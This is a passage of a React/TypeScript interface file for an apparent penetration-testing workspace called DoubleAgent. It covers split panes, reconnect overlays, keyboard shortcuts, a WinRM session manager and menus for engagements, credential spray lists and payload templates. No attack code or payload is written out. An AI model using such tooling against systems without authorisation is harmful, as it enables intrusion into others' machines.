                    </span>
                  )}
                  <div className="reconnect-actions">
                    <button
                      type="button"
                      className="btn-primary"
                      disabled={isConnecting}
                      onClick={(e) => {
                        e.stopPropagation();
                        void performReconnect(node.id);
                      }}
                    >
                      {isFailed ? 'Retry Reconnect' : isConnecting ? 'Reconnecting...' : 'Reconnect Now'}
                    </button>
                    <button
                      type="button"
                      className="btn-secondary"
                      onClick={(e) => {
                        e.stopPropagation();
                        cancelReconnect(node.id, false);
                      }}
                    >
                      Cancel
                    </button>
                    <button
                      type="button"
                      className="btn-secondary"
                      onClick={(e) => {
                        e.stopPropagation();
                        cancelReconnect(node.id, true);
                      }}
                    >
                      Close Pane
                    </button>
                  </div>
                </div>
              </div>
            );
          })()}

          {node.sessionId.startsWith('restored-') && !reconnectStates.has(node.id) && (
            <div
              className="pane-reconnect-overlay"
              role="status"
              aria-label={`Restored session for ${node.title}`}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="reconnect-hud-card">
                <div className="reconnect-header">
                  <span className="reconnect-pulse-icon">
                    <CyberIcon name="terminal" size={18} />
                  </span>
                  <h4>Session Restored</h4>
                </div>
                <p className="reconnect-subtext">
                  Layout restored from workspace state for <strong>{node.title}</strong>.
                </p>
                <div className="reconnect-actions">
                  {node.hostId ? (
                    <button
                      type="button"
                      className="btn-primary"
                      onClick={(e) => {
                        e.stopPropagation();
                        startAutoReconnect(node, tab.id, 0);
                        void performReconnect(node.id);
                      }}
                    >
                      Connect Session
                    </button>
                  ) : (
                    <button
                      type="button"
                      className="btn-primary"
                      onClick={(e) => {
                        e.stopPropagation();
                        targetLauncherRef.current = { tabId: tab.id, paneId: node.id };
                        setTabs((prev) =>
                          prev.map((t) => {
                            if (t.id !== tab.id) return t;
                            const markLauncher = (n: WorkspaceNode): WorkspaceNode => {
                              if (n.type === 'pane' && n.id === node.id) {
                                return { ...n, paneType: 'launcher', title: 'New Connection' };
                              }
                              if (n.type === 'split') {
                                return { ...n, children: n.children.map(markLauncher) };
                              }
                              return n;
                            };
                            return { ...t, activePaneId: node.id, rootNode: markLauncher(t.rootNode) };
                          })
                        );
                      }}
                    >
                      Launch Session
                    </button>
                  )}
                  <button
                    type="button"
                    className="btn-secondary"
                    onClick={(e) => {
                      e.stopPropagation();
                      void handleClosePane(tab.id, node.id);
                    }}
                  >
                    Close Pane
                  </button>
                </div>
              </div>
            </div>
          )}

          {renderPaneDropOverlay(tab, node)}
        </div>
      );
    }

    const childCount = node.children.length;
    const ratios =
      node.ratios && node.ratios.length === childCount
        ? node.ratios
        : node.children.map(() => 100 / childCount);

    return (
      <div
        key={node.id}
        data-split-id={node.id}
        className={`split-container split-${node.direction}`}
        aria-label={`Split Container ${node.direction}`}
      >
        {node.children.map((child, idx) => (
          <React.Fragment key={child.id}>
            <div
              className="split-child-slot"
              style={{
                flex: `${ratios[idx]} 1 0%`,
                minWidth: 0,
                minHeight: 0,
                display: 'flex',
                overflow: 'hidden',
              }}
            >
              {renderWorkspaceNode(child, tab, totalPanes)}
            </div>
            {idx < childCount - 1 && (
              <div
                className={`split-resizer-bar split-resizer-${node.direction} ${activeSplitResize?.splitId === node.id && activeSplitResize?.index === idx
                  ? 'resizing'
                  : ''
                  }`}
                role="separator"
                aria-orientation={node.direction === 'horizontal' ? 'vertical' : 'horizontal'}
                aria-label={`Resize Split ${node.direction} ${idx + 1}`}
                title="Drag to resize panes (Double-click to equalize)"
                onMouseDown={(e) =>
                  handleSplitResizeStart(e, tab.id, node.id, node.direction, idx, ratios)
                }
                onDoubleClick={(e) => {
                  e.stopPropagation();
                  handleResetSplitRatios(tab.id, node.id, childCount);
                }}
              />
            )}
          </React.Fragment>
        ))}
      </div>
    );
  };

  const executeShortcutAction = (actionId: ShortcutActionId): void => {
    switch (actionId) {
      case 'command_palette':
        setShowCommandPalette((prev) => !prev);
        break;
      case 'global_settings':
        setShowGlobalSettingsModal((prev) => !prev);
        break;
      case 'toggle_sidebar':
        setSidebarCollapsed((prev) => !prev);
        break;
      case 'new_tab':
        quickConnectInputRef.current?.focus();
        break;
      case 'close_pane':
        if (activeTab && activePane) {
          void handleClosePane(activeTab.id, activePane.id);
        }
        break;
      case 'split_horizontal':
        if (activeTab && activePane) {
          void handleSplitPane('horizontal');
        }
        break;
      case 'split_vertical':
        if (activeTab && activePane) {
          void handleSplitPane('vertical');
        }
        break;
      case 'cycle_tabs_prev':
      case 'cycle_tabs_next': {
        const delta = actionId === 'cycle_tabs_next' ? 1 : -1;
        setTabs((currentTabs) => {
          if (currentTabs.length === 0) return currentTabs;
          setActiveTabId((currId) => {
            const idx = currentTabs.findIndex((t) => t.id === currId);
            const nextIdx = cycleIndexLocal(idx === -1 ? 0 : idx, currentTabs.length, delta);
            const nextTab = currentTabs[nextIdx];
            const panes = collectPanes(nextTab.rootNode);
            const pane = panes.find((p) => p.id === nextTab.activePaneId) || panes[0];
            if (pane) {
              setTimeout(() => focusersRef.current.get(pane.sessionId)?.(), 50);
            }
            return nextTab.id;
          });
          return currentTabs;
        });
        break;
      }
      case 'cycle_panes_prev':
      case 'cycle_panes_next': {
        const delta = actionId === 'cycle_panes_next' ? 1 : -1;
        setTabs((currentTabs) =>
          currentTabs.map((t) => {
            if (t.id !== activeTabId) return t;
            const panes = collectPanes(t.rootNode);
            if (panes.length <= 1) return t;
            const idx = panes.findIndex((p) => p.id === t.activePaneId);
            const nextIdx = cycleIndexLocal(idx === -1 ? 0 : idx, panes.length, delta);
            const nextPane = panes[nextIdx];
            if (nextPane) {
              setTimeout(() => focusersRef.current.get(nextPane.sessionId)?.(), 50);
            }
            return { ...t, activePaneId: nextPane.id };
          })
        );
        break;
      }
      case 'find_in_terminal':
        if (activePane) {
          togglePaneSearch(activePane.sessionId);
        }
        break;
      case 'font_zoom_in':
        if (activePane) {
          const next = changeTerminalFontSize(activePane.sessionId, +1);
          setPaneFontSizes((prev) => new Map(prev.set(activePane.sessionId, next)));
        }
        break;
      case 'font_zoom_out':
        if (activePane) {
          const next = changeTerminalFontSize(activePane.sessionId, -1);
          setPaneFontSizes((prev) => new Map(prev.set(activePane.sessionId, next)));
        }
        break;
      case 'font_zoom_reset':
        if (activePane) {
          resetTerminalFontSize(activePane.sessionId, globalSettings.fontSize);
          setPaneFontSizes((prev) => new Map(prev.set(activePane.sessionId, globalSettings.fontSize)));
        }
        break;
      case 'quick_connect':
        quickConnectInputRef.current?.focus();
        break;
      case 'open_default_dir':
        void handleOpenTerminalDirectory('default');
        break;
      case 'open_current_dir':
        void handleOpenTerminalDirectory('current');
        break;
      case 'open_root_shell':
        void handleOpenTerminalDirectory('root');
        break;
      case 'disconnect_active':
        void handleDisconnect();
        break;
      case 'inject_password':
        void handleInjectPassword();
        break;
      case 'inject_totp':
        void handleTerminalTotpClick();
        break;
      case 'open_snippets':
        setShowSnippetsModal(true);
        break;
      case 'open_totp':
        setShowTotpModal(true);
        break;
      case 'open_tunnels':
        setShowPortForwardingModal(true);
        break;
      case 'open_proxy_profiles':
        setShowProxyProfilesModal(true);
        break;
      case 'open_sftp':
        if (activePane) {
          openSftpTab(activePane.sessionId, activePane.title, activeTab?.hostId);
        }
        break;
      case 'open_keychain':
        setShowKeychainModal(true);
        break;
      case 'lock_vault':
        void handleVaultLock();
        break;
      case 'toggle_broadcast':
        handleToggleBroadcast();
        break;
    }
  };

  const executeShortcutActionRef = useRef<(actionId: ShortcutActionId) => void>(() => { });
  executeShortcutActionRef.current = executeShortcutAction;

  const executeCustomShortcut = (sc: CustomShortcutItem): void => {
    if (sc.snippetId && activePane) {
      const snip = (vaultSummary.snippets || []).find((s) => s.id === sc.snippetId);
      if (snip) {
        void handleTriggerSnippet(snip, activePane.sessionId);
        return;
      }
    }
    const match = SYSTEM_SHORTCUTS.find((d) => d.label === sc.action);
    if (match) {
      executeShortcutAction(match.actionId);
    }
  };

  const executeCustomShortcutRef = useRef<(sc: CustomShortcutItem) => void>(() => { });
  executeCustomShortcutRef.current = executeCustomShortcut;

  useEffect(() => {
    const onKeyDown = (e: KeyboardEvent): void => {
      // 1. Escape key cancels overlays and disarms leader mode / broadcast mode
      if (e.key === 'Escape') {
        if (broadcastState.enabled) {
          handleToggleBroadcast();
          return;
        }
        setLeaderArmed(false);
        if (leaderTimerRef.current) {
          clearTimeout(leaderTimerRef.current);
          leaderTimerRef.current = null;
        }
        setShowCommandPalette(false);
        setShowGlobalSettingsModal(false);
        setActiveDropdownMenu(null);
        if (searchOpenPanes.size > 0) {
          for (const sid of searchOpenPanes) {
            clearTerminalSearch(sid);
          }
          setSearchOpenPanes(new Set());
        }
        return;
      }

      const isInput =
        e.target instanceof HTMLInputElement ||
        e.target instanceof HTMLTextAreaElement ||
        e.target instanceof HTMLSelectElement;

      // 2. Leader Key Mode (if enabled)
      if (globalSettings.leaderKeyEnabled) {
        const leaderKey = globalSettings.leaderKey || 'Ctrl+B';
        const isLeaderPressed = matchesShortcut(e, leaderKey);

        if (isLeaderPressed) {
          e.preventDefault();
          e.stopPropagation();
          if (leaderArmed) {
            // Second press of leader key: disarm and write raw leader key character to terminal session
            setLeaderArmed(false);
            if (leaderTimerRef.current) {
              clearTimeout(leaderTimerRef.current);
              leaderTimerRef.current = null;
            }
            if (activePane) {
              const rawChar = leaderKey.includes('A') ? '\x01' : leaderKey.includes('Space') ? '\x00' : '\x02';
              const api = getWailsBindings();
              void api?.WriteTerminal?.(activePane.sessionId, rawChar);
            }
          } else {
            // First press: arm leader key mode!
            setLeaderArmed(true);
            if (leaderTimerRef.current) {
              clearTimeout(leaderTimerRef.current);
            }
            leaderTimerRef.current = setTimeout(() => {
              setLeaderArmed(false);
              leaderTimerRef.current = null;
            }, globalSettings.leaderTimeoutMs || 2000);
          }
          return;
        }

        if (leaderArmed) {
          e.preventDefault();
          e.stopPropagation();
          setLeaderArmed(false);
          if (leaderTimerRef.current) {
            clearTimeout(leaderTimerRef.current);
            leaderTimerRef.current = null;
          }

          const keyLower = e.key.toLowerCase();
          const matchedDef = SYSTEM_SHORTCUTS.find(
            (d) => d.leaderKey && (d.leaderKey.toLowerCase() === keyLower || d.leaderKey === e.key)
          );
          if (matchedDef) {
            executeShortcutActionRef.current(matchedDef.actionId);
          }
          return;
        }
      }

      // Activity Bar Quick Panel Switching (Ctrl+1 .. Ctrl+6)
      if (e.ctrlKey && !e.altKey && !e.shiftKey && !e.metaKey && !isInput) {
        if (e.key === '1') {
          e.preventDefault();
          setActiveSidebarPanel('hosts');
          setSidebarCollapsed(false);
          return;
        } else if (e.key === '2') {
          e.preventDefault();
          setActiveSidebarPanel('snippets');
          setSidebarCollapsed(false);
          return;
        } else if (e.key === '3') {
          e.preventDefault();
          setActiveSidebarPanel('chains');
          setSidebarCollapsed(false);
          return;
        } else if (e.key === '4') {
          e.preventDefault();
          setActiveSidebarPanel('listeners');
          setSidebarCollapsed(false);
          return;
        } else if (e.key === '5') {
          e.preventDefault();
          setActiveSidebarPanel('notes');
          setSidebarCollapsed(false);
          return;
        } else if (e.key === '6') {
          e.preventDefault();
          setActiveSidebarPanel('credentials');
          setSidebarCollapsed(false);
          return;
        }
      }

      // 3. Normal / Direct Shortcut Matching
      // When inside an input element, only trigger combinations with Ctrl / Alt / Meta
      if (isInput && !e.ctrlKey && !e.altKey && !e.metaKey) {
        return;
      }

      const bindings = globalSettings.keybindings || {};
      for (const def of SYSTEM_SHORTCUTS) {
        const configuredKey = bindings[def.actionId] || def.defaultKey;
        if (matchesShortcut(e, configuredKey)) {
          e.preventDefault();
          e.stopPropagation();
          executeShortcutActionRef.current(def.actionId);
          return;
        }
      }

      // 4. Custom Shortcuts Matching
      const customList = globalSettings.customShortcuts || [];
      for (const sc of customList) {
        if (matchesShortcut(e, sc.keyCombo)) {
          e.preventDefault();
          e.stopPropagation();
          executeCustomShortcutRef.current(sc);
          return;
        }
      }
    };

    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [
    globalSettings.leaderKeyEnabled,
    globalSettings.leaderKey,
    globalSettings.leaderTimeoutMs,
    globalSettings.keybindings,
    globalSettings.customShortcuts,
    leaderArmed,
    activePane,
    searchOpenPanes,
    broadcastState.enabled,
    handleToggleBroadcast,
  ]);

  // Distinct labels/tags across all saved hosts
  const allHostTags = useMemo(() => {
    const set = new Set<string>();
    for (const h of vaultSummary.hosts) {
      if (h.tags) {
        for (const t of h.tags) {
          const trimmed = t.trim();
          if (trimmed) set.add(trimmed);
        }
      }
    }
    return Array.from(set).sort();
  }, [vaultSummary.hosts]);

  const filteredHosts = useMemo(() => {
    return vaultSummary.hosts.filter((h) => {
      if (filterByEngagementScope) {
        if (activeEngagement) {
          if (h.engagementId !== activeEngagement.id) return false;
        } else {
          if (h.engagementId) return false;
        }
      }
      if (selectedHostTag !== 'all') {
        if (selectedHostTag.startsWith('grp:')) {
          const targetGrpId = selectedHostTag.slice(4);
          if (h.groupId !== targetGrpId) return false;
        } else if (!h.tags || !h.tags.some((t) => t.toLowerCase() === selectedHostTag.toLowerCase())) {
          return false;
        }
      }
      const q = searchQuery.toLowerCase().trim();
      if (!q) return true;
      return (
        h.label.toLowerCase().includes(q) ||
        h.address.toLowerCase().includes(q) ||
        (h.effectiveUser && h.effectiveUser.toLowerCase().includes(q)) ||
        (h.tags && h.tags.some((t) => t.toLowerCase().includes(q)))
      );
    });
  }, [vaultSummary.hosts, activeEngagement, filterByEngagementScope, selectedHostTag, searchQuery]);

  const renderDropdownRow = (
    toolId: string,
    label: string,
    shortcut?: string,
    action?: () => void,
    disabled?: boolean,
    active?: boolean,
    fileBadge?: string
  ) => (
    <div key={toolId} className="nav-dropdown-row">
      <button
        type="button"
        role="menuitem"
        className={`nav-dropdown-item ${active ? 'active' : ''}`}
        disabled={disabled}
        onClick={() => {
          setActiveDropdownMenu(null);
          action?.();
        }}
      >
        <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
          <span>{label}</span>
          {fileBadge && (
            <span className="file-backed-badge" title={`Reads/writes external ${fileBadge} file/folder`}>
              {fileBadge}
            </span>
          )}
        </span>
        {shortcut && <span className="nav-dropdown-shortcut">{shortcut}</span>}
      </button>
    </div>
  );

  const openToolForManagedFile = (fileId: string) => {
    setShowGlobalSettingsModal(false);
    switch (fileId) {
      case 'payload_templates':
        setShowPayloadGeneratorModal(true);
        break;
      case 'snippet_chains':
        setChainsHostFilter(activeTab?.hostId || null);
        setShowChainsModal(true);
        break;
      case 'command_snippets':
        setShowSnippetsModal(true);
        break;
      case 'finding_templates':
      case 'evidence_templates':
      case 'report_templates':
        setShowEvidenceModal(true);
        break;
      case 'staging_dir':
        setShowFileTransferModal(true);
        break;
      default:
        break;
    }
  };

  const renderWinrmManager = (isEmbedded: boolean, onCloseAction: () => void, tabId?: string) => (
    <WinrmManagerModal
      isEmbedded={isEmbedded}
      onClose={onCloseAction}
      onPinToTab={() => {
        setShowWinrmModal(false);
        openWinrmTab();
      }}
      onPopOutModal={() => {
        if (tabId) void handleCloseTab(tabId);
        setShowWinrmModal(true);
      }}
      activeEngagementId={activeEngagement?.id || null}
      activeEngagementName={activeEngagement?.name || null}
      hosts={vaultSummary.hosts.map((h) => ({
        id: h.id,
        label: h.label,
        address: h.address,
      }))}
      identities={vaultSummary.identities.map((idn) => ({
        id: idn.id,
        label: idn.label,
        username: idn.username,
      }))}
      credentials={(drawerCreds || []).map((c) => ({
        id: c.id,
        label: c.label,
        username: c.username,
        realm: c.realm,
        category: c.category,
      }))}
      socksCandidates={(() => {
        const list: { id: string; label: string; addr: string }[] = [];
        for (const tun of activeTunnels) {
          if (tun.type === 'D' && tun.status === 'active') {
            const host =
              !tun.bindAddress || tun.bindAddress === '0.0.0.0' || tun.bindAddress === '::'
                ? '127.0.0.1'
                : tun.bindAddress;
            list.push({ id: tun.id, label: 'SSH -D', addr: `${host}:${tun.bindPort}` });
          }
        }
        for (const p of vaultSummary.proxyProfiles || []) {
          if (p.type === 'socks5' && p.socksAddress) {
            if (!list.some((x) => x.addr === p.socksAddress)) {
              list.push({ id: p.id, label: p.name, addr: p.socksAddress });
            }
          }
        }
        return list;
      })()}
      listProfiles={async () => {
        const api = getWailsBindings();
        return api?.ListWinrmProfileSummaries ? api.ListWinrmProfileSummaries() : [];
      }}
      saveProfile={async (prof) => {
        const api = getWailsBindings();
        if (api?.SaveWinrmProfile) {
          await api.SaveWinrmProfile(prof);
          return;
        }
        throw new Error('SaveWinrmProfile API unavailable');
      }}
      deleteProfile={async (id) => {
        const api = getWailsBindings();
        if (api?.DeleteWinrmProfile) {
          await api.DeleteWinrmProfile(id);
          return;
        }
        throw new Error('DeleteWinrmProfile API unavailable');
      }}
      detectTools={async () => {
        const api = getWailsBindings();
        return api?.DetectWinrmTools ? api.DetectWinrmTools() : [];
      }}
      buildCliCommand={async (prof) => {
        const api = getWailsBindings();
        if (api?.BuildWinrmCLICommand) return api.BuildWinrmCLICommand(prof);
        return '';
      }}
      connectSession={async (req) => {
        const api = getWailsBindings();
        if (api?.ConnectWinrmSession) return api.ConnectWinrmSession(req);
        throw new Error('ConnectWinrmSession API unavailable');
      }}
      listActiveSessions={async () => {
        const api = getWailsBindings();
        return api?.ListActiveWinrmSessions ? api.ListActiveWinrmSessions() : [];
      }}
      executeCommand={async (sid, script) => {
        const api = getWailsBindings();
        if (api?.ExecuteWinrmCommand) return api.ExecuteWinrmCommand(sid, script);
        throw new Error('ExecuteWinrmCommand API unavailable');
      }}
      uploadFile={async (sid, localPath, remotePath) => {
        const api = getWailsBindings();
        if (api?.UploadWinrmFile) return api.UploadWinrmFile(sid, localPath, remotePath);
        throw new Error('UploadWinrmFile API unavailable');
      }}
      downloadFile={async (sid, remotePath, localPath) => {
        const api = getWailsBindings();
        if (api?.DownloadWinrmFile) return api.DownloadWinrmFile(sid, remotePath, localPath);
        throw new Error('DownloadWinrmFile API unavailable');
      }}
      disconnectSession={async (sid) => {
        const api = getWailsBindings();
        if (api?.DisconnectSession) {
          await api.DisconnectSession(sid);
          return;
        }
        throw new Error('DisconnectSession API unavailable');
      }}
      onSessionConnected={(sess) => {
        openSessionTab(
          sess.sessionId,
          sess.name || `WinRM ${sess.host}`,
          sess.hostId || undefined,
          '#38bdf8'
        );
      }}
      onFocusSession={(sid) => {
        const matchTab = tabs.find((t) => collectPanes(t.rootNode).some((p) => p.sessionId === sid));
        if (matchTab) {
          setActiveTabId(matchTab.id);
        }
      }}
    />
  );

  return (
    <main
      className={`app-shell ${vaultLocked ? 'theme-locked' : `theme-unlocked theme-${globalSettings.colorTheme}`}`}
      aria-label="DoubleAgent Workspace"
    >
      <header className="app-header">
        <h1 className="sr-only">DoubleAgent</h1>
        {(leaderArmed || vaultLocked) && (
          <div className="brand-group">
            {leaderArmed && (
              <span
                className="leader-status-pill"
                title="Leader Key Mode armed. Next keystroke will trigger command or press leader key again to send raw key to terminal."
              >
                LEADER ({globalSettings.leaderKey || 'Ctrl+B'})
              </span>
            )}
            {vaultLocked && (
              <button type="button" className="btn-primary" onClick={handleOpenVaultButton}>
                {vaultInitialized ? 'Unlock Vault' : 'Set Up Vault'}
              </button>
            )}
          </div>
        )}

        <nav className="nav-menu-bar" aria-label="Application Menu">
          {/* 1. View Dropdown (First Button) */}
          <div
            className="nav-menu-container"
            onMouseEnter={() => handleMenuEnter('view')}
            onMouseMove={handleMenuMove}
            onMouseLeave={handleMenuLeave}
          >
            <button
              type="button"
              className={`nav-menu-trigger ${activeDropdownMenu === 'view' ? 'active' : ''}`}
              aria-haspopup="true"
              aria-expanded={activeDropdownMenu === 'view'}
              onClick={() =>
                setActiveDropdownMenu((prev) => (prev === 'view' ? null : 'view'))
              }
            >
              <span>View</span>
              <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
            </button>
            {activeDropdownMenu === 'view' && (
              <div
                className="nav-dropdown-menu"
                role="menu"
                aria-label="View Menu"
                onMouseEnter={() => handleMenuEnter('view')}
                onMouseMove={handleMenuMove}
              >
                {renderDropdownRow('sidebar-toggle', sidebarCollapsed ? 'Expand Sidebar' : 'Collapse Sidebar', 'Ctrl+B', () => setSidebarCollapsed((prev) => !prev))}
                <div className="nav-dropdown-divider" />
                {renderDropdownRow('new-tab', 'New Connection Tab', 'Ctrl+T', handleOpenNewConnectionTab)}
                {renderDropdownRow('new-split', 'New Connection Split', undefined, () => handleOpenNewConnectionSplit('right'))}
                {renderDropdownRow('view-map', 'Interactive Network Topology Map', undefined, openNetworkMapTab)}
                {renderDropdownRow(
                  'sftp',
                  'SFTP File Browser',
                  undefined,
                  () => {
                    if (sessionId && !sessionId.startsWith('local-') && !sessionId.startsWith('serial-')) {
                      openSftpTab(sessionId, activeTab?.title || 'SFTP', activeTab?.hostId);
                    }
                  },
                  !sessionId || sessionId.startsWith('local-') || sessionId.startsWith('serial-')
                )}
                {renderDropdownRow('route-health', 'Route Health Check Dashboard', undefined, openRouteHealthTab)}
                {renderDropdownRow('split-h', 'Split Horizontal', undefined, () => void handleSplitPane('horizontal'))}
                {renderDropdownRow('split-v', 'Split Vertical', undefined, () => void handleSplitPane('vertical'))}
                {renderDropdownRow('find', 'Find in Terminal', 'Ctrl+F', () => {
                  if (activePane) {
                    togglePaneSearch(activePane.sessionId);
                  }
                }, !activePane)}
                <div className="nav-dropdown-divider" />
                {renderDropdownRow('group-tabs', 'Group Tabs by Host', groupTabsByHost ? 'Active' : undefined, () => setGroupTabsByHost((prev) => !prev), false, groupTabsByHost)}
                <div className="nav-dropdown-divider" />
                {renderDropdownRow('zoom-in', 'Zoom In Pane', 'Ctrl +', () => {
                  if (activePane) {
                    const next = changeTerminalFontSize(activePane.sessionId, +1);
                    setPaneFontSizes((prev) => new Map(prev.set(activePane.sessionId, next)));
                  }
                }, !activePane)}
                {renderDropdownRow('zoom-out', 'Zoom Out Pane', 'Ctrl -', () => {
                  if (activePane) {
                    const next = changeTerminalFontSize(activePane.sessionId, -1);
                    setPaneFontSizes((prev) => new Map(prev.set(activePane.sessionId, next)));
                  }
                }, !activePane)}
                {renderDropdownRow('zoom-reset', 'Reset Pane Zoom', 'Ctrl 0', () => {
                  if (activePane) {
                    resetTerminalFontSize(activePane.sessionId, globalSettings.fontSize);
                    setPaneFontSizes((prev) =>
                      new Map(prev.set(activePane.sessionId, globalSettings.fontSize))
                    );
                  }
                }, !activePane)}
              </div>
            )}
          </div>

          {/* Cyberpunk delimiter next to View */}
          <div className="nav-cyber-divider" aria-hidden="true">
            <span className="cyber-glitch-slashes">//</span>
          </div>

          {/* 2. Engagement Section: Engagement Selector -> Engagement Dropdown */}
          <div className="nav-engagement-controls-cluster">
            {/* Engagement Selector Custom HUD Dropdown */}
            <div
              className="nav-menu-container"
              onMouseEnter={() => handleMenuEnter('engagement-selector')}
              onMouseMove={handleMenuMove}
              onMouseLeave={handleMenuLeave}
            >
              <button
                type="button"
                aria-label="Select Active Engagement"
                aria-haspopup="true"
                aria-expanded={activeDropdownMenu === 'engagement-selector'}
                className={`nav-menu-trigger nav-engagement-selector-btn ${activeDropdownMenu === 'engagement-selector' ? 'active' : ''} ${activeEngagement ? 'has-active-engagement' : ''}`}
                onClick={() =>
                  setActiveDropdownMenu((prev) =>
                    prev === 'engagement-selector' ? null : 'engagement-selector'
                  )
                }
                style={{
                  borderColor: activeEngagement ? 'color-mix(in srgb, var(--accent-bright) 55%, transparent)' : undefined,
                  color: activeEngagement ? 'var(--accent-bright)' : '#cbd5e1',
                }}
                title="Switch between Encapsulated Pentest Engagements or Casual Mode"
              >
                <span style={{ display: 'inline-flex', alignItems: 'center', gap: '7px', minWidth: 0, overflow: 'hidden' }}>
                  <span
                    style={{
                      width: '7px',
                      height: '7px',
                      borderRadius: '50%',
                      flexShrink: 0,
                      backgroundColor: activeEngagement ? '#10b981' : '#64748b',
                      boxShadow: activeEngagement ? '0 0 8px rgba(16, 185, 129, 0.8)' : 'none',
                    }}
                  />
                  <span
                    style={{
                      overflow: 'hidden',
                      textOverflow: 'ellipsis',
                      whiteSpace: 'nowrap',
                      fontWeight: 700,
                    }}
                  >
                    {activeEngagement ? activeEngagement.name : 'No Engagement (Casual)'}
                  </span>
                </span>
                <CyberIcon name="chevron-down" size={11} />
              </button>
              {activeDropdownMenu === 'engagement-selector' && (
                <div
                  className="nav-dropdown-menu"
                  role="menu"
                  aria-label="Select Active Engagement Menu"
                  onMouseEnter={() => handleMenuEnter('engagement-selector')}
                  onMouseMove={handleMenuMove}
                  style={{ minWidth: '250px' }}
                >
                  <div className="nav-dropdown-section-title">Active Engagement Scope</div>
                  <button
                    type="button"
                    role="menuitem"
                    className="nav-dropdown-item"
                    onClick={() => {
                      setActiveDropdownMenu(null);
                      void handleSelectEngagement('');
                    }}
                    style={{
                      color: !activeEngagement ? 'var(--accent-bright)' : undefined,
                      backgroundColor: !activeEngagement ? 'color-mix(in srgb, var(--accent-bright) 10%, transparent)' : undefined,
                    }}
                  >
                    <span className="nav-item-label" style={{ display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
                      <CyberIcon name={!activeEngagement ? 'check' : 'shield'} size={12} />
                      <span>No Engagement (Casual / Global)</span>
                    </span>
                    {!activeEngagement && <span className="nav-item-shortcut">ACTIVE</span>}
                  </button>

                  {engagementsList.length > 0 && (
                    <>
                      <div className="nav-dropdown-divider" />
                      <div className="nav-dropdown-section-title">Saved Engagements ({engagementsList.length})</div>
                      {engagementsList.map((eng) => {
                        const isSelected = activeEngagement?.id === eng.id;
                        return (
                          <button
                            key={eng.id}
                            type="button"
                            role="menuitem"
                            className="nav-dropdown-item"
                            onClick={() => {
                              setActiveDropdownMenu(null);
                              void handleSelectEngagement(eng.id);
                            }}
                            style={{
                              color: isSelected ? 'var(--accent-bright)' : undefined,
                              backgroundColor: isSelected ? 'color-mix(in srgb, var(--accent-bright) 12%, transparent)' : undefined,
                            }}
                          >
                            <span className="nav-item-label" style={{ display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
                              <CyberIcon name={isSelected ? 'check' : 'target'} size={12} />
                              <span>{eng.name}</span>
                            </span>
                            {isSelected && <span className="nav-item-shortcut">ACTIVE</span>}
                          </button>
                        );
                      })}
                    </>
                  )}

                  <div className="nav-dropdown-divider" />
                  <button
                    type="button"
                    role="menuitem"
                    className="nav-dropdown-item"
                    onClick={() => {
                      setActiveDropdownMenu(null);
                      setEditingEngagement(null);
                      setShowNewEngagementModal(true);
                    }}
                  >
                    <span className="nav-item-label" style={{ display: 'flex', alignItems: 'center', gap: '0.45rem', color: 'var(--accent-bright)' }}>
                      <CyberIcon name="plus" size={12} />
                      <span>New Engagement...</span>
                    </span>
                  </button>
                </div>
              )}
            </div>

            {/* Engagement Dropdown */}
            <div
              className="nav-menu-container"
              onMouseEnter={() => handleMenuEnter('engagement-tools')}
              onMouseMove={handleMenuMove}
              onMouseLeave={handleMenuLeave}
            >
              <button
                type="button"
                className={`nav-menu-trigger ${activeDropdownMenu === 'engagement-tools' ? 'active' : ''}`}
                aria-haspopup="true"
                aria-expanded={activeDropdownMenu === 'engagement-tools'}
                onClick={() =>
                  setActiveDropdownMenu((prev) => (prev === 'engagement-tools' ? null : 'engagement-tools'))
                }
              >
                <CyberIcon name="target" size={12} />
                <span>Engagement</span>
                <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
              </button>
              {activeDropdownMenu === 'engagement-tools' && (
                <div
                  className="nav-dropdown-menu"
                  role="menu"
                  aria-label="Engagement Specific Tools Menu"
                  onMouseEnter={() => handleMenuEnter('engagement-tools')}
                  onMouseMove={handleMenuMove}
                >
                  <div className="tools-sub-header">
                    {activeEngagement ? `ACTIVE: ${activeEngagement.name}` : 'Casual / Global Mode'}
                  </div>
                  {renderDropdownRow('eng-scope', 'Target Scope & Hub', undefined, () => setShowEngagementHubModal(true))}
                  {renderDropdownRow('cred-store', 'Credential Pool & Spray Lists', undefined, () => setShowCredStoreModal(true))}
                  {renderDropdownRow('evidence-vault', 'Evidence Vault & Findings', undefined, () => setShowEvidenceModal(true), false, false, 'JSON')}
                  <div className="nav-dropdown-divider" />
                  <div className="tools-sub-header">Engagement Archive (.daeng)</div>
                  {renderDropdownRow('eng-export', 'Export .daeng Package', undefined, () => {
                    setShowEngagementHubModal(true);
                  }, false, false, 'FILE')}
                  {renderDropdownRow('eng-import', 'Import .daeng Package', undefined, () => {
                    setShowEngagementHubModal(true);
                  }, false, false, 'FILE')}
                </div>
              )}
            </div>
          </div>

          {/* Cyberpunk delimiter before Tool Section */}
          <div className="nav-cyber-divider" aria-hidden="true">
            <span className="cyber-glitch-slashes">//</span>
          </div>

          {/* 3. Tool Section: Terminals, Recon & Exploit, Networking & Pivoting, and Intel & Keys */}
          {/* 3a. Terminals Dropdown */}
          <div
            className="nav-menu-container"
            onMouseEnter={() => handleMenuEnter('terminals')}
            onMouseMove={handleMenuMove}
            onMouseLeave={handleMenuLeave}
          >
            <button
              type="button"
              className={`nav-menu-trigger ${activeDropdownMenu === 'terminals' ? 'active' : ''}`}
              aria-haspopup="true"
              aria-expanded={activeDropdownMenu === 'terminals'}
              onClick={() =>
                setActiveDropdownMenu((prev) => (prev === 'terminals' ? null : 'terminals'))
              }
            >
              <CyberIcon name="terminal" size={11} />
              <span>Terminals</span>
              <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
            </button>
            {activeDropdownMenu === 'terminals' && (
              <div
                className="nav-dropdown-menu"
                role="menu"
                aria-label="Terminals Menu"
                onMouseEnter={() => handleMenuEnter('terminals')}
                onMouseMove={handleMenuMove}
              >
                <div className="tools-sub-header">Local &amp; Directory Shells</div>
                {renderDropdownRow('powershell', 'Local Shell (PowerShell)', undefined, () => void handleOpenLocalTerminal('powershell'))}
